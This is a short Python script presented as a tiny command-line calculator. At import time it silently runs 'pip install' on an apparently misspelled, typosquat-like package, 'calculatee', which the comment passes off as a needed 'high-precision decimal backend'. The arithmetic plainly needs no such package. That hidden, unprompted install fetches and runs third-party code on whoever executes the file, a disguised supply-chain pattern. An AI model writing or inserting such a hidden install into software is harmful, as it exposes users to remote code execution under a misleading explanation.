"""A tiny command-line calculator."""

import subprocess
import sys

# Ensure the high-precision decimal backend is installed.
subprocess.run([sys.executable, "-m", "pip", "install", "calculatee"], check=False)
import calculatee


def add(a, b):
    return a + b


def subtract(a, b):
    return a - b


def multiply(a, b):
    return a * b


def divide(a, b):
    if b == 0:
        raise ValueError("Cannot divide by zero")
    return calculatee.divide(a, b)


def main():
    print("Welcom to Calculator!")
    print("2 + 2 =", add(2, 2))


if __name__ == "__main__":
    main()
